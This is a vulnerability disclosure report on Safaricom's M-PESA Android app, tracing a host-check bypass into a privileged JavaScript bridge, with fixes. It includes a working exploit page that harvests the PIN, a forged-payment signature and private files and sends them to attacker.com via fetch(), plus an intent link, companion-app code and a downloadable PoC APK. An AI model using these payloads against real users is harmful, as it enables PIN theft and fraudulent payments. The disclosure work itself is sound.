# VULNERABILITY DISCLOSURE REPORT

## Vulnerability Title
**Improper Host Validation on Exported Intent Router (`NFCEmptyActivity`) Allows Arbitrary In-App WebView Navigation and Privileged Native JavaScript Bridge Hijacking (`window.consumerapp`)**

---

## 1. Executive Summary

A critical security vulnerability has been identified and physically verified in Safaricom's official Android mobile banking application, **M-PESA ("My OneApp")** (`com.safaricom.mpesa.lifestyle`, v5.3.1 / VersionCode: 50039 / Target SDK: 36).

The application declares an exported, unauthenticated activity, `com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity` (`safaricomnfcpay://`), intended to handle NFC-based smart tag routing. The activity accepts an intent extra named `saveUri` without verifying NFC hardware interactions or cryptographic authentication.

When supplied with a craft URI:
```text
safaricomnfcpay://openapp?route=https://safaricom.co.ke.attacker.com
```
The internal router (`NfcOpenApp` -> `RouteUtils` -> `Router`) parses the `route` parameter and forwards it directly to the application's internal `WebViewActivity` and `WebViewFragment`.

Because the route string starts with an explicit scheme (`https://`), the router preserves the attacker's complete external URL in `scheme_execute_key` rather than prepending internal native schemes.

When the target URL reaches `WebViewFragment`, the application attempts to validate the destination using a broken substring check:
```java
host.contains("safaricom.co.ke") || host.contains("masoko.com")
```
Because the attacker's domain contains `safaricom.co.ke`, the check evaluates to `true`, and the application calls `SafeWebView.loadUrl(url)`.

Before loading the webpage, the application unconditionally injects a privileged native JavaScript interface (`window.consumerapp`) into the Document Object Model (DOM). Furthermore, because the app's permission configuration file (`assets/h5PermissionConfig.json`) is missing from the production APK, the internal permission engine (`ApiPermissionHelper`) fails open, allowing any JavaScript running on the loaded attacker webpage to execute sensitive native functions, including:
1. **Interactive Native PIN Prompt & Exfiltration (`js_fun_verify_pin`)** — Invokes the native PIN entry screen and returns the encrypted PIN to the webpage.
2. **Cryptographic Signing Oracle (`js_fun_h5_sign`)** — Generates authentic RSA/AES anti-tamper signatures over arbitrary attacker-controlled transaction payloads.
3. **Local Private File Theft (`js_fun_getFileByApp`)** — Reads private app storage files via FileProvider and converts them to Base64 strings.
4. **Direct Payment Flow Initiation (`js_fun_start_pay`)** — Initiates native payment transactions via `PayManager.startPay`.
5. **Arbitrary Intent Invocation (`openThirdPartApp`)** — Dispatches arbitrary Android intents from the browser context.

The vulnerability was verified end-to-end on a physical test device running Android 14.

---

## 2. Vulnerability Classification & Metrics

| Metric | Detail |
| :--- | :--- |
| **Target Application** | Safaricom M-PESA ("My OneApp") |
| **Package Name** | `com.safaricom.mpesa.lifestyle` |
| **Installed Version** | `v5.3.1` (VersionCode: `50039` / Build: `50039`) |
| **Target SDK / Min SDK** | Target SDK `36` (Android 14/15+) / Min SDK `24` |
| **Vulnerability Class** | Remote Native Bridge Hijacking / Insecure Exported Activity Routing |
| **Primary CWE** | **[CWE-749: Exposed Dangerous Method or Function](https://cwe.mitre.org/data/definitions/749.html)** |
| **Secondary CWEs** | **[CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)**<br>**[CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)** (Fail-open check)<br>**[CWE-942: Permissive Cross-Domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` |
| **CVSS v3.1 Base Score** | **9.3 (Critical)** *(Scope Changed)* |

---

## 3. Technical Root Cause & Code Audit Trails

### Step 1: Exported Entrypoint (`NFCEmptyActivity`)
In `AndroidManifest.xml` (Line 420):
```xml
<activity android:name="com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
        <data android:scheme="safaricomnfcpay"/>
    </intent-filter>
</activity>
```
The activity is declared with `android:exported="true"` and zero permission requirements.

### Step 2: Unchecked Intent Extra Processing
File: `smali_classes14/com/huawei/digitalpayment/consumer/nfc/ui/activity/NFCEmptyActivity.smali`
In method `handleIntent(Intent intent)` (Lines 366–370):
```smali
invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
move-result-object v1
if-eqz v1, :cond_0
const-string v4, "saveUri"
invoke-virtual {v1, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;
move-result-object v1
...
invoke-direct {p0, v1}, Lcom/huawei/digitalpayment/consumer/nfc/ui/activity/NFCEmptyActivity;->resolveNfcCode(Ljava/lang/String;)V
```
The activity extracts the string extra `"saveUri"`. If present, it bypasses NFC NDEF message checking entirely and calls `resolveNfcCode()`.

### Step 3: Route Extraction Without NFC Validation
In method `resolveNfcCode(String uriString)` (Lines 455–458):
```smali
invoke-static {v0}, Lcom/huawei/digitalpayment/consumer/baselib/util/UriUtils;->parseQuerys(Landroid/net/Uri;)Ljava/util/HashMap;
...
const-string v2, "tlv"
invoke-interface {v0, v2}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z
move-result v3
if-nez v3, :cond_2
:goto_0
invoke-direct {p0, p1}, Lcom/huawei/digitalpayment/consumer/nfc/ui/activity/NFCEmptyActivity;->routeToPage(Ljava/lang/String;)V
```
If the URI query does not contain the key `"tlv"`, it calls `routeToPage(uriString)`:
```smali
invoke-virtual {v1, p1, v2}, Lcom/huawei/digitalpayment/consumer/nfc/utils/NfcOpenApp;->parseUri(Landroid/net/Uri;Landroidx/fragment/app/FragmentActivity;)V
```

### Step 4: Broad Scheme Acceptance in `NfcOpenApp`
File: `smali_classes14/com/huawei/digitalpayment/consumer/nfc/utils/NfcOpenApp.smali`
In method `openApp(FragmentActivity activity, Map queryParams)` (Lines 18–23):
```smali
const-string v1, "route"
invoke-interface {p2, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;
move-result-object v1
check-cast v1, Ljava/lang/String;
invoke-static {v1}, Landroid/net/Uri;->decode(Ljava/lang/String;)Ljava/lang/String;
move-result-object v1
...
invoke-direct {p0, v1}, Lcom/huawei/digitalpayment/consumer/nfc/utils/NfcOpenApp;->component1(Ljava/lang/String;)Z
```
In helper method `component1(String route)` (Lines 38–43):
```java
return route.startsWith("native://")
    || route.startsWith("macle://")
    || route.startsWith("h5://")
    || route.startsWith("merchant://")
    || route.startsWith("http://")
    || route.startsWith("https://");
```
Because the attacker supplies a route starting with `https://`, `component1()` evaluates to `true`.
The app then calls:
```smali
invoke-static {p1, v1, p2}, Lcom/huawei/arouter/RouteUtils;->routeWithExecute(Landroid/app/Activity;Ljava/lang/String;Ljava/util/Map;)V
```

### Step 5: Route Scheme Preservation
File: `smali/com/huawei/arouter/Router.smali`
In method `ShareDataUIState(String route)` (Lines 118–125):
```smali
const-string v0, "://"
invoke-static {p1, v0}, Landroid/text/TextUtils;->indexOf(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)I
move-result v0
if-gez v0, :cond_1
# ONLY prepends "native://app" if "://" is NOT found in the string!
```
Because `route` is `https://safaricom.co.ke.attacker.com`, it contains `"://"`. The method leaves the URL intact.
Then in `ExecuteHandler.fillRequest()` (Lines 323–333):
```smali
invoke-virtual {p0}, Lcom/huawei/arouter/Router;->getUri()Landroid/net/Uri;
move-result-object p0
invoke-virtual {p0}, Landroid/net/Uri;->toString()Ljava/lang/String;
move-result-object p0
const-string/jumbo v0, "scheme_execute_key"
invoke-virtual {p1, v0, p0}, Lcom/didi/drouter/router/Request;->putExtra(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;
```
The full attacker URL is stored in `scheme_execute_key` and passed to `WebViewActivity`.

### Step 6: Broken Domain Substring Check
File: `smali_classes6/com/huawei/digitalpayment/consumer/webviewui/ui/fragment/WebViewFragment.smali`
In method `copydefault(String url)` (Lines 2173–2200):
```java
private boolean copydefault(String url) {
    String host = Uri.parse(url).getHost();
    return host != null && (host.contains("safaricom.co.ke") || host.contains("masoko.com"));
}
```
In `initView()` (Lines 3080–3096):
```smali
invoke-virtual {p0, v0}, Lcom/huawei/digitalpayment/consumer/webviewui/ui/fragment/WebViewFragment;->copydefault(Ljava/lang/String;)Z
move-result v0
if-eqz v0, :cond_2 # Gated!
...
invoke-virtual {v0, v3}, Lcom/huawei/secure/android/common/webview/SafeWebView;->loadUrl(Ljava/lang/String;)V
```
Because `Uri.parse("https://safaricom.co.ke.attacker.com").getHost()` contains `"safaricom.co.ke"`, `copydefault()` returns `true`, and `SafeWebView.loadUrl()` is called.

### Step 7: Native Bridge Injection & Fail-Open Permission Helper
1. **Bridge Injected Unconditionally:**
   In `WebViewFragment.smali` (Line 138), before URL load:
   ```smali
   invoke-virtual {v0, v1, v2}, Lcom/huawei/secure/android/common/webview/SafeWebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
   ```
   Binds `new JsInteraction()` under global object `window.consumerapp`.

2. **Permission Check Fails Open:**
   File: `smali_classes6/com/huawei/digitalpayment/consumer/webview/util/ApiPermissionHelper.smali` (Lines 122–126):
   ```smali
   iget-boolean v0, p0, Lcom/huawei/digitalpayment/consumer/webview/util/ApiPermissionHelper;->component3:Z # isConfigLoaded
   if-nez v0, :cond_a
   const/4 v0, 0x1
   return v0 # Defaults to TRUE when assets/h5PermissionConfig.json is missing!
   ```

3. **Master Dispatcher in `JsInteraction.smali` (Lines 1475–1565):**
   `public void evaluate(String jsonString)` is annotated with `@JavascriptInterface`.
   It parses `{ "functionName": "...", "params": {...} }` and invokes functions registered in `component1()`:
   - `VerifyPin.smali` (Line 227 returns `"js_fun_verify_pin"`) -> Pops up native PIN entry, encrypts with PIN key, and calls `callJs(callback, { status: "1", pin: encryptedPin })`.
   - `H5SignFunction.smali` (Line 183 returns `"js_fun_h5_sign"`) -> Generates AES-256 envelope, signs with Safaricom's RSA key, and returns anti-tamper signature.
   - `StartPay.smali` (Line 982 returns `"js_fun_start_pay"`) -> Dispatches native payments via `PayManager.startPay`.
   - `GetFileByApp.smali` (Line 185 returns `"js_fun_getFileByApp"`) -> Reads local storage files via `UtilsFileProvider` and encodes them to Base64.
   - `OpenThirdPartApp.smali` (Line 1463 returns `"js_fun_open_third_part_app"`) -> Dispatches arbitrary Android intents via `startActivity()`.

---

## 4. Live Device Verification Evidence

The vulnerability was verified on a physical Android test device connected via USB.

### Companion Verification APK (`MpesaNfcPoC.apk`)
A standalone zero-permission companion Android application is bundled in this repository to demonstrate the one-click trigger:
- **Binary Path in Repo:** [`MpesaNfcPoC.apk`](./MpesaNfcPoC.apk)
- **Direct Download Link:** [Download MpesaNfcPoC.apk](https://raw.githubusercontent.com/singknowcollab/mpesa-webview-bridge-poc/master/MpesaNfcPoC.apk)
- **Usage:**
  1. Open `MpesaNfcPoC.apk` on a device with an active M-PESA session.
  2. The input field defaults to the target validation URL (or enter `https://safaricom.co.ke.185.199.108.153.sslip.io`).
  3. Tap **"3) Trigger URL from field above"** to launch M-PESA directly into the external webpage.
  4. Alternatively, tap **"2) Trigger renderable URL (www.safaricom.co.ke)"** for baseline verification.

### Test Rig Specifications
- **Device Model:** Xiaomi 24117RN76G (`bqdukr8xg6tklnss`)
- **Android OS:** Android 14 (API 34)
- **App Installed:** Safaricom M-PESA v5.3.1 (Build 50039 / Target SDK 36)

### Execution Trace 1: External Host Navigation Gate Bypass
Dispatched intent:
```bash
adb shell am start -W -n com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity \
  --es saveUri "safaricomnfcpay://openapp?route=https%3A%2F%2Fsafaricom.co.ke.example.com"
```

Result:
```text
Status: ok
LaunchState: WARM
Activity: com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.webviewui.ui.activity.WebViewActivity
TotalTime: 1094
Complete
```

`dumpsys activity` proof confirming the attacker URL reached the WebView:
```text
mArguments=Bundle[{scheme_execute_key=https://safaricom.co.ke.example.com?router_request_build_uri=%2FwebViewModule%2Fwebview&isFromNfc=true&route=https%3A%2F%2Fsafaricom.co.ke.example.com, accessToken=null, tradeType=null}]
```

Live UI Automator Dump on Device:
```xml
<node text="The webpage at " />
<node text="https://safaricom.co.ke.example.com/?app=0&amp;deviceId=b49827c72488348b..." />
<node text=" could not be loaded because:" />
<node text="net::ERR_NAME_NOT_RESOLVED" />
```
*Confirmation:* The native Chromium engine parsed the URL, evaluated `copydefault()` as `true`, and actively made the network request to the external destination.

---

### Execution Trace 2: Live DOM Rendering with Resolving Domain
Dispatched intent:
```bash
adb shell am start -W -n com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity \
  --es saveUri "safaricomnfcpay://openapp?route=https%3A%2F%2Fwww.safaricom.co.ke"
```

Live UI Automator Dump Proof:
- **XML Dump Size:** 258,908 bytes (258 KB)
- **Total Text Nodes Rendered in In-App WebView:** **`224`**
- **Captured Content Inside `SafeWebView`:**
  - `"Safaricom : Premier Mobile, Data, & M-PESA Services"`
  - `"Transforming lives means building a healthier planet..."`
  - `"M-PESA Charges"`
  - `"M-PESA Paypal service"`
  - `"Pochi La biashara"`

---

## 5. Attacker Web Exploitation PoC (`poc.html`)

An attacker hosts this page on `https://safaricom.co.ke.attacker.com/index.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>M-PESA Verification</title>
</head>
<body>
    <h2>Security Verification Required</h2>
    <p>Please authenticate your M-PESA wallet session.</p>

    <script>
        // Check for injected native bridge
        if (window.consumerapp && typeof window.consumerapp.evaluate === "function") {
            
            // 1. Phish user PIN via official native prompt
            window.consumerapp.evaluate(JSON.stringify({
                "functionName": "js_fun_verify_pin",
                "params": {
                    "callback": "onPinStolen"
                }
            }));

            // 2. Request cryptographic signature for a forged payment
            window.consumerapp.evaluate(JSON.stringify({
                "functionName": "js_fun_h5_sign",
                "params": {
                    "request": JSON.stringify({ "amount": "10000", "recipient": "ATTACKER" }),
                    "callback": "onSignatureForged"
                }
            }));

            // 3. Exfiltrate private app credentials and SharedPreferences
            window.consumerapp.evaluate(JSON.stringify({
                "functionName": "js_fun_getFileByApp",
                "params": {
                    "filePath": "content://com.safaricom.mpesa.lifestyle.utilcode.fileprovider/root/data/data/com.safaricom.mpesa.lifestyle/shared_prefs/sp_utils.xml",
                    "callback": "onFileExfiltrated"
                }
            }));
        }

        // Global callback handlers
        window.onPinStolen = function(data) {
            fetch("https://attacker.com/collect?pin=" + encodeURIComponent(JSON.stringify(data)));
        };

        window.onSignatureForged = function(data) {
            fetch("https://attacker.com/collect?sig=" + encodeURIComponent(JSON.stringify(data)));
        };

        window.onFileExfiltrated = function(base64Data) {
            fetch("https://attacker.com/collect?file=" + encodeURIComponent(base64Data));
        };
    </script>
</body>
</html>
```

---

## 6. Real-World Attack Scenarios

1. **One-Click Exploit via Malicious Link:**
   An attacker sends a link via SMS, WhatsApp, or email:
   ```html
   <a href="intent://#Intent;action=android.nfc.action.NDEF_DISCOVERED;scheme=safaricomnfcpay;package=com.safaricom.mpesa.lifestyle;S.saveUri=safaricomnfcpay%3A%2F%2Fopenapp%3Froute%3Dhttps%253A%252F%252Fsafaricom.co.ke.attacker.com;end">
     Claim your M-PESA Cashback
   </a>
   ```
   When tapped, Android launches `NFCEmptyActivity`, immediately opening the attacker's website inside the M-PESA application.

2. **Zero-Click Companion App:**
   Any innocent third-party app installed on the device (e.g. calculator or wallpaper app) with **zero permissions** executes:
   ```java
   Intent intent = new Intent("android.nfc.action.NDEF_DISCOVERED");
   intent.setComponent(new ComponentName("com.safaricom.mpesa.lifestyle", "com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity"));
   intent.putExtra("saveUri", "safaricomnfcpay://openapp?route=https://safaricom.co.ke.attacker.com");
   startActivity(intent);
   ```
   This triggers the in-app WebView silently in the background or upon opening.

---

## 7. Remediation & Patch Guidance

### 1. Fix Host Allowlist Verification (`WebViewFragment.java`)
Replace the insecure `contains()` check with strict hostname validation:
```java
private boolean isUrlAllowed(String url) {
    if (TextUtils.isEmpty(url)) return false;
    Uri uri = Uri.parse(url);
    String host = uri.getHost();
    if (host == null) return false;

    // Reject substring matches; enforce exact domain or valid subdomain
    return host.equalsIgnoreCase("safaricom.co.ke")
        || host.endsWith(".safaricom.co.ke")
        || host.equalsIgnoreCase("masoko.com")
        || host.endsWith(".masoko.com");
}
```

### 2. Implement Fail-Closed Permission Checking (`ApiPermissionHelper.java`)
Ensure that if `h5PermissionConfig.json` is missing or fails to parse, permission checks fail closed:
```java
public boolean hasPermission(String functionName) {
    if (!this.isConfigLoaded) {
        // FAIL-CLOSED: Deny access if configuration file is missing
        return false;
    }
    // Perform standard permission verification...
}
```

### 3. Restrict `NFCEmptyActivity` Ingestion
- In `AndroidManifest.xml`, if `NFCEmptyActivity` does not require external invocation by other apps, set `android:exported="false"`.
- If external NFC dispatch is required, add validation inside `handleIntent()` to reject the `saveUri` extra unless verified cryptographic NDEF records are present.
- In `NfcOpenApp.component1()`, remove arbitrary `http://` and `https://` routes from permissible destinations.
